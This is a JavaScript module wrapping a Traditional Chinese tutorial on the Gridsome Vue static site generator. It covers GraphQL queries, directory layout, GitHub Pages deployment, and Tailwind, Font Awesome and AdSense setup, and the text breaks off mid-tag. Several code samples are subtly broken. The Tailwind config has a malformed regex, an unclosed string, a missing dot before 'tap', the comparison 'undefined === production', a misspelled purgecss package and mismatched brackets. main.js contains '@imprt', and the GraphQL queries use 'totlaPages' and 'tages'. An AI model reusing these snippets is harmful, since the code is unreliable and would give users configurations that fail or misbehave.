var Mod76 = {"title":"Vue 靜態網頁產生器 Gridsome","slug":"vue-gridsome","html":"<h2 id=\"what-is-gridsome\">What is gridsome</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://gridsome.org/\">Gridsome</a> 是一套 Vue.js 靜態網站產生器的 JAMstack (JavaScript、API、Markup) 架構框架，建構靈感來自於 React 製的靜態網站生成框架 Gatsby。</li>\n<li>JAMStack 架構可以達成更好的網站效能、更低的建構成本、更高的安全性與更良好的開發者體驗。</li>\n<li>Gridsome 最大的特徵為使用 GraphQL 方式取得資料，在選取資料來源上有非常高的自由度。</li>\n<li>在建構階段便處理好所有的效能優化，包括 <code>code-splitting</code>、<code>asset optimisation</code>、<code>lazy-loading</code>，以及滿分的 <code>Lighthouse scores out-of-the-box</code>。</li>\n</ul>\n<h2 id=\"graphql？\">GraphQL？</h2>\n<h3 id=\"query\">Query</h3>\n<pre class=\"language-GraphQL\"><code class=\"language-GraphQL\">query {\n  # 想取得的資料模型名稱\n  persona(personId: 1) {\n    # 想取得的資料內容\n    name\n    age\n    address\n    # 也可取得相關資料模型\n    company {\n      name\n    }\n  }\n}</code></pre><h3 id=\"mutation\">Mutation</h3>\n<pre class=\"language-GraphQL\"><code class=\"language-GraphQL\">mutation personMutation {\n  update(name: \"New name\") {\n    id\n    name\n  }\n}</code></pre><h3 id=\"subscription\">Subscription</h3>\n<pre class=\"language-GraphQL\"><code class=\"language-GraphQL\">subscription {\n  nameChange {\n    name\n  }\n}</code></pre><h2 id=\"安裝框架\">安裝框架</h2>\n<ul>\n<li><code>yarn global add @gridsome/cli</code> or <code>npm install --global @gridsome/cli</code></li>\n</ul>\n<h2 id=\"創建專案\">創建專案</h2>\n<ol>\n<li><code>gridsome create my-gridsome-site</code></li>\n<li><code>cd my-gridsome-site</code></li>\n<li><code>gridsome develop</code></li>\n</ol>\n<h2 id=\"目錄結構\">目錄結構</h2>\n<pre class=\"language-\"><code class=\"language-\">.\n├── package.json\n├── gridsome.config.js\n├── gridsome.server.js\n├── static/\n└── src/\n    ├── main.js\n    ├── index.html\n    ├── App.vue\n    ├── components/\n    ├── layouts/\n    │   └── Default.vue\n    ├── pages/\n    │   ├── Index.vue\n    │   └── Blog.vue\n    └── templates/\n        └── BlogPost.vue</code></pre><h3 id=\"packagejson\"><code>package.json</code></h3>\n<p>此檔案包含 project 所使用的 plugins 資訊。</p>\n<h3 id=\"gridsomeconfigjs\"><code>gridsome.config.js</code></h3>\n<p>此檔案包含 project 和 plugins 的設定資訊。\n更多資訊請參考 <a target=\"_blank\" rel=\"nofollow\" href=\"https://gridsome.org/docs/config/\">Project configuration</a>。</p>\n<h3 id=\"gridsomeserverjs\"><code>gridsome.server.js</code></h3>\n<p>此檔案可自選是否要使用，用於串接 Gridsome 伺服器的各個部份。此檔案必須 export 一存取 API 用的 function。</p>\n<h3 id=\"src\"><code>/src</code>:</h3>\n<ul>\n<li><code>main.js</code>: 從此導入通用樣式和 scripts。此檔案亦可 export 一存取客戶端 API 用的 function。安裝 Vue plugins、註冊 components 和 directives 亦在此檔案內處理。</li>\n<li><code>components/</code>: 在此資料夾內新增會插入至 Pages 和 Layouts 內的 Components。</li>\n<li><code>layouts/</code>: Layouts 是 Pages 和 Templates 這類內容的 Vue Components 包裝器。\n像 headers、footers、sidebars 這類網站上的 components 都會放在 Layouts 裡。</li>\n<li><code>pages/</code>: Pages 通常用於一般頁面或從 GraphQL 集合中列出的項目。\n從這邊新增 <code>.vue</code> 檔案以創建頁面。 例如 <strong>About.vue</strong> 會建立 <strong>site.com/about</strong> 頁面。</li>\n<li><code>templates/</code>: Templates 負責顯示節點 (單頁) 的集合。\n用於 <strong>GraphQL 集合</strong> 的樣板應該新增於此。\n例如要建立 <code>WordPressPost</code> 集合的樣板，要於此資料夾新增檔案 <code>WordPressPost.vue</code>。</li>\n<li><code>index.html</code>: 當需要覆寫原本用於產生頁面的 HTML 樣板時，只需要在 <code>src</code> 資料夾內建立一個新的 <code>index.html</code> 檔案即可。</li>\n<li><code>App.vue</code>: <code>App.vue</code> 是包含所有 pages 和 templates 的主要 component。當想修改所有頁面上的 layout 時，可以在 <code>src</code> 資料夾內新增 <code>App.vue</code> 覆寫預設內容。</li>\n<li>(可選) <code>assets/</code>: 通用樣式、圖片、字體、 icons 檔案。</li>\n<li>(可選) <code>data/</code>: 如 <code>.json</code> 或 <code>.yaml</code> 這類匯入至 components 內的資料檔案。</li>\n</ul>\n<h3 id=\"static\"><code>/static</code>:</h3>\n<p>此資料夾下的檔案會在編譯時直接複製到 dist 資料夾內。</p>\n<h3 id=\"components\">Components</h3>\n<h4 id=\"images\">Images</h4>\n<p>Gridsome 內建有 <code>&lt;g-image&gt;</code> component 輸出已經最佳化過的漸進式圖片。可在寬度或高度改變時即時修改或裁剪圖片尺寸。 <code>&lt;g-images&gt;</code> 也會建立一個超小的模糊行內 base64 圖片，並使用 IntersectionObserver 達成 lazy load 的效果。</p>\n<h4 id=\"linking\">Linking</h4>\n<p>Gridsome 內建有 <code>&lt;g-link&gt;</code> component 使用 IntersectionObserver 預先取得畫面裡的連結頁面。這使得 Gridsome 網站能在點擊頁面時的瀏覽速度大幅加快。</p>\n<h2 id=\"速成專案\">速成專案</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/gridsome/gridsome-starter-default\">gridsome/gridsome-starter-default: 🐣 Default starter for Gridsome</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/gridsome/gridsome-starter-blog\">gridsome/gridsome-starter-blog: A simple, hackable &amp; minimalistic starter for Gridsome that uses Markdown for content.</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/noxify/gridsome-starter-casper-v2\">noxify/gridsome-starter-casper-v2: Grisome starter based on Ghost Casper V2 and tailwindcss.</a></li>\n</ul>\n<h2 id=\"撰寫內容\">撰寫內容</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://fpjs.fun/gridsome/data/markdown/\">使用 Gridsome 讀取 Markdown | 點燈坊</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/neneta0921/items/2dff64e3c9589e046330\">Gridsome でブログを作成する - Building a Blog with Vue and Markdown Using Gridsome - Qiita</a></li>\n</ul>\n<p>原始碼基礎架構和 Vue 相去不大，多了一個 <code>&lt;page-query&gt;</code> 撰寫 GraphQL 語法用。</p>\n<pre class=\"language-vue\"><code class=\"language-vue\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>template</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">></span></span>Latest blog posts<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">v-for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>edge in $page.posts.edges<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">:key</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>edge.node.id<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        {{ edge.node.title }}\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>template</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>page-query</span><span class=\"token punctuation\">></span></span>\nquery Blog {\n  posts: allWordPressPost (limit: 5) {\n    edges {\n      node {\n        id\n        title\n      }\n    }\n  }\n}\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>page-query</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"query-1\">query</h3>\n<h4 id=\"gridsomeconfigjs-1\"><code>gridsome.config.js</code></h4>\n<pre class=\"language-js\"><code class=\"language-js\">module<span class=\"token punctuation\">.</span>exports <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  siteName<span class=\"token operator\">:</span> <span class=\"token string\">\"Gridsome Blog\"</span><span class=\"token punctuation\">,</span>\n  siteDescription<span class=\"token operator\">:</span> <span class=\"token string\">\"A simple blog designed with Gridsome\"</span><span class=\"token punctuation\">,</span>\n  plugins<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">{</span>\n      use<span class=\"token operator\">:</span> <span class=\"token string\">\"@gridsome/source-filesystem\"</span><span class=\"token punctuation\">,</span>\n      options<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n        path<span class=\"token operator\">:</span> <span class=\"token string\">\"content/posts/**/*.md\"</span><span class=\"token punctuation\">,</span>\n        typeName<span class=\"token operator\">:</span> <span class=\"token string\">\"Post\"</span><span class=\"token punctuation\">,</span>\n        route<span class=\"token operator\">:</span> <span class=\"token string\">\"/blog/:slug\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"indexvue\"><code>Index.vue</code></h4>\n<pre class=\"language-GraphQL\"><code class=\"language-GraphQL\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>page-query</span><span class=\"token punctuation\">></span></span>\nquery ($page: Int) {\n  posts: allPost(filter: { published: { eq: true }}, perPage: 10, page: $page) @paginate {\n    totalCount\n    pageInfo {\n      totalPages\n      currentPage\n    }\n    edges {\n      node {\n        id\n        title\n        date (format: \"YYYY-MM-DD\")\n        timeToRead\n        description\n        cover_image (width: 770, height: 380, blur: 10)\n        path\n        tags {\n          id\n          title\n          path\n        }\n      }\n    }\n  }\n}\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>page-query</span><span class=\"token punctuation\">></span></span></code></pre><h4 id=\"homevue\"><code>Home.vue</code></h4>\n<pre class=\"language-GraphQL\"><code class=\"language-GraphQL\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>page-query</span><span class=\"token punctuation\">></span></span>\nquery Home ($page: Int) {\n  posts: allPost (page: $page, perPage: 9) @paginate {\n    totalCount\n    pageInfo {\n      totlaPages\n      currentPage\n    }\n    edges {\n      node {\n        id\n        title\n        timeToRead\n        content\n        excerpt\n        description\n        path\n        tages {\n          id\n          title\n          path\n        }\n      }\n    }\n  }\n}\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>page-query</span><span class=\"token punctuation\">></span></span></code></pre><h4 id=\"postvue\"><code>Post.vue</code></h4>\n<pre class=\"language-GraphQL\"><code class=\"language-GraphQL\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>page-query</span><span class=\"token punctuation\">></span></span>\nquery Post ($id: ID!) {\n  post: post (id: $id) {\n    title\n    path\n    date (format: \"YYYY-MM-DD\")\n    timeToRead\n    tags {\n      id\n      title\n      path\n    }\n    description\n    content\n    cover_image (width: 860, blur: 10)\n  }\n}\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>page-query</span><span class=\"token punctuation\">></span></span></code></pre><p><code>Tag.vue</code></p>\n<pre class=\"language-GraphQL\"><code class=\"language-GraphQL\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>page-query</span><span class=\"token punctuation\">></span></span>\nquery Tag ($id: ID!) {\n  tag (id: $id) {\n    title\n    belongsTo {\n      edges {\n        node {\n          ...on Post {\n            title\n            path\n            date (format: \"YYYY-MM-DD\")\n            timeToRead\n            description\n            content\n          }\n        }\n      }\n    }\n  }\n}\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>page-query</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"修正預設路由無法處理中文標題的問題\">修正預設路由無法處理中文標題的問題</h3>\n<ol>\n<li>在 markdown 檔案的 meta 資訊裡加入 <code>path</code> 供路由處理使用</li>\n<li>將 <code>gridsome.config.js</code> 的 <code>templates</code> 裡的 <code>Post</code> 改為 <code>/:path</code></li>\n</ol>\n<h2 id=\"推播上線\">推播上線</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://gridsome.org/docs/deploy-to-github/\">Deploy to GitHub pages - Gridsome</a></li>\n</ul>\n<ol>\n<li>使用 git 建立版控，使用 <code>git remote add origin &lt;url&gt;</code> 設定 repo</li>\n<li>使用 <code>yarn add gh-pages</code> 或 <code>npm i gh-pages</code> 安裝 <code>gh-pages</code></li>\n<li>於 <code>gridsome.config.js</code> 裡新增</li>\n</ol>\n<pre class=\"language-js\"><code class=\"language-js\">  siteUrl<span class=\"token operator\">:</span> <span class=\"token string\">'https://&lt;your-github-username>.github.io'</span><span class=\"token punctuation\">,</span>\n  pathPrefix<span class=\"token operator\">:</span> <span class=\"token string\">'/&lt;your-gridsome-repo-name>'</span><span class=\"token punctuation\">,</span></code></pre><ol start=\"4\">\n<li>於 <code>package.json</code> 裡新增</li>\n</ol>\n<pre class=\"language-json\"><code class=\"language-json\">  \"predeploy\": \"npm run build\",\n  \"deploy\": \"gh-pages -d dist\"</code></pre><ol start=\"5\">\n<li>執行指令 <code>npm run deploy</code></li>\n</ol>\n<h2 id=\"可用插件\">可用插件</h2>\n<h3 id=\"tailwindcss\">Tailwindcss</h3>\n<ul>\n<li><code>yarn add tailwindcss --dev</code></li>\n<li><code>yarn add @fullhuman/postcss-purgecss --dev</code></li>\n<li><code>yarn add postcss-import --dev</code></li>\n<li><code>yarn add postcss-nested --dev</code></li>\n</ul>\n<p><code>gridsome.config.js</code>:</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">TailwindExtractor</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">static</span> <span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">content</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> content<span class=\"token punctuation\">.</span><span class=\"token function\">match</span><span class=\"token punctuation\">(</span><span class=\"token regex\">/{A-Za-z0-0-_:\\/]+/g</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\nmodule<span class=\"token punctuation\">.</span>exports <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// ...</span>\n  <span class=\"token function-variable function\">chainWebpack</span><span class=\"token operator\">:</span> <span class=\"token parameter\">config</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    config<span class=\"token punctuation\">.</span>module\n      <span class=\"token punctuation\">.</span><span class=\"token function\">rule</span><span class=\"token punctuation\">(</span><span class=\"token string\">'css'</span><span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">.</span><span class=\"token function\">oneOf</span><span class=\"token punctuation\">(</span>'normal<span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">'postcss-loader'</span><span class=\"token punctuation\">)</span>\n      <span class=\"token function\">tap</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">options</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n        options<span class=\"token punctuation\">.</span>plugins<span class=\"token punctuation\">.</span><span class=\"token function\">unshift</span><span class=\"token punctuation\">(</span><span class=\"token operator\">...</span><span class=\"token punctuation\">[</span>\n          <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'postcss-import'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n          <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'postcss-nested'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n          <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'tailwindcss'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">undefined</span> <span class=\"token operator\">===</span> <span class=\"token string\">'production'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        options<span class=\"token punctuation\">.</span>plugins<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token operator\">...</span><span class=\"token punctuation\">[</span>\n          <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'@fullhuman/postcss-prugecss'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            content<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n              <span class=\"token string\">'src/assets/**/*.css'</span><span class=\"token punctuation\">,</span>\n              <span class=\"token string\">'src/**/*.vue'</span><span class=\"token punctuation\">,</span>\n              <span class=\"token string\">'src/**/*.js'</span>\n            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            extractors<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n              <span class=\"token punctuation\">{</span>\n                extractor<span class=\"token operator\">:</span> TailwindExtractor<span class=\"token punctuation\">,</span>\n                extensions<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'css'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vue'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'js'</span><span class=\"token punctuation\">]</span>\n              <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n          <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">}</span>\n\n      <span class=\"token keyword\">return</span> options\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">}</span></code></pre><p><code>main.js</code>:</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">/*! purgecss start ignore */</span>\n@<span class=\"token keyword\">import</span> <span class=\"token string\">'tailwindcss/base'</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">/*! purgecss end ignore */</span>\n\n@<span class=\"token keyword\">import</span> <span class=\"token string\">'tailwindcss/components'</span><span class=\"token punctuation\">;</span>\n@imprt <span class=\"token string\">'tailwindcss/utilities'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Other import css file</span>\n<span class=\"token comment\">// @import './components/custom-css-file</span></code></pre><h3 id=\"font-awesome\">Font Awesome</h3>\n<h4 id=\"安裝\">安裝</h4>\n<ul>\n<li><code>npm i -D @fortawesome/{vue-fontawesome,fontawesome-svg-core,free-brands-svg-icons}</code></li>\n<li>免費圖示：\n<br>├ <code>@fortawesome/free-solid-svg-icons</code>\n<br>├ <code>@fortawesome/free-regular-svg-icons</code>\n<br>└ <code>@fortawesome/free-brands-svg-icons</code></li>\n<li>付費圖示：\n<br>├ <code>@fortawesome/pro-solid-svg-icons</code>\n<br>├ <code>@fortawesome/pro-regular-svg-icons</code>\n<br>├ <code>@fortawesome/pro-light-svg-icons</code>\n<br>└ <code>@fortawesome/pro-duotone-svg-icons</code></li>\n</ul>\n<h4 id=\"設定付費資訊\">設定付費資訊</h4>\n<pre class=\"language-bash\"><code class=\"language-bash\"># A. 全體設定\nnpm config set \"@fortawesome:registry\" https://npm.fontawesome.com/ &amp;&amp; \\\nnpm config set \"//npm.fontawesome.com/:_authToken\" TOKEN\n\n# B. 在 project 主資料夾或與 package.json 相同位置的資料夾裡建立 .npmrc 檔案設定\n@fortawesome:registry=https://npm.fontawesome.com/\n//npm.fontawesome.com/:_authToken=TOKEN</code></pre><h4 id=\"導入\">導入</h4>\n<p><code>main.js</code></p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> library <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@fortawesome/fontawesome-svg-core\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 圖示名稱至 fontawesome 網站 https://fontawesome.com/icons?d=gallery 上搜尋</span>\n<span class=\"token comment\">// 依欲使用的風格選擇</span>\n<span class=\"token comment\">// free-solid-svg-icons 為填滿圖示，通常以 fas 為標頭</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> 欲使用的圖示名稱 <span class=\"token keyword\">as</span> 圖示變數 <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@fortawesome/free-solid-svg-icons\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> faStar <span class=\"token keyword\">as</span> fasStar <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@fortawesome/free-solid-svg-icons\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// free-regular-svg-icons 為一般圖示，通常以 far 為標頭</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> 欲使用的圖示名稱 <span class=\"token keyword\">as</span> 圖示變數 <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@fortawesome/free-regular-svg-icons\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> faStar <span class=\"token keyword\">as</span> farStar <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@fortawesome/free-regular-svg-icons\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> FontAwesomeIcon <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@fortawesome/vue-fontawesome\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 加入至 project 中</span>\nlibrary<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>欲使用的圖示名稱<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nVue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"font-awesome-icon\"</span><span class=\"token punctuation\">,</span> FontAwesomeIcon<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"使用\">使用</h4>\n<p>元件的名稱於上方的 <code>Vue.component</code> 裡設定，如文內的範例是 <code>font-awesome-icon</code>；在欲使用的頁面裡加入：\n<br><code>&lt;font-awesome-icon :icon=&quot;[&#39;圖示標頭&#39;, &#39;圖示名稱&#39;]&quot; /&gt;</code>\n<br>ex: <code>&lt;font-awesome-icon :icon=&quot;[&#39;fab&#39;, &#39;font-awesome&#39;]&quot; /&gt;</code></p>\n<h3 id=\"google-adsense\">Google Adsense</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.google.com/adsense/new/\">Adsense</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://knote.dev/post/2020-04-19/gridsome-google-adsense/\">Gridsome で作ったサイトに Google Adsense を導入する方法 | K note</a></li>\n</ul>\n<ol>\n<li>在 <code>&lt;head&gt;&lt;/head&gt;</code> 內新增 Adsense 需要的 Script\n由於使用 Gridsome 在 <code>src/main.js</code> 內新增的方法，會因為 <code>vue-meta</code> 在切換頁面時遇到錯誤，</li>\n</ol>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">Vue<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span> head <span class=\"token punctuation\">}</span></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  head<span class=\"token punctuation\">.</span>script<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    type<span class=\"token operator\">:</span> <span class=\"token string\">\"text/javascript\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"data-ad-client\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ca-pub-XXXXXXXXXXXXXXXX\"</span><span class=\"token punctuation\">,</span>\n    src<span class=\"token operator\">:</span> <span class=\"token string\">\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"</span><span class=\"token punctuation\">,</span>\n    async<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><pre class=\"language-undefined\"><code class=\"language-undefined\">需改為直接加在 `src/index.html` 的 `<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>` 標籤內。</code></pre><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">${htmlAttrs}</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    ${head}\n\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span>\n      <span class=\"token attr-name\">async</span>\n      <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js<span class=\"token punctuation\">\"</span></span>\n      <span class=\"token attr-name\">data-ad-client</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>ca-pub-XXXXXXXXXXXXXXXX<span class=\"token punctuation\">\"</span></span>\n    <span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span> <span class=\"token attr-name\">${bodyAttrs}</span><span class=\"token punctuation\">></span></span>\n    ${app} ${scripts}\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre><ol start=\"2\">\n<li>新增 Adsense 用的 component <code>components/Adsense.vue</code></li>\n</ol>\n<pre class=\"language-vue\"><code class=\"language-vue\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>template</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ins</span>\n    <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>adsbygoogle<span class=\"token punctuation\">\"</span></span>\n    <span class=\"token attr-name\">:data-ad-layout</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>adLayout<span class=\"token punctuation\">\"</span></span>\n    <span class=\"token attr-name\">:data-ad-client</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>adClient<span class=\"token punctuation\">\"</span></span>\n    <span class=\"token attr-name\">:data-ad-slot</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>adSlot<span class=\"token punctuation\">\"</span></span>\n    <span class=\"token attr-name\">:data-ad-format</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>adFormat<span class=\"token punctuation\">\"</span></span>\n    <span 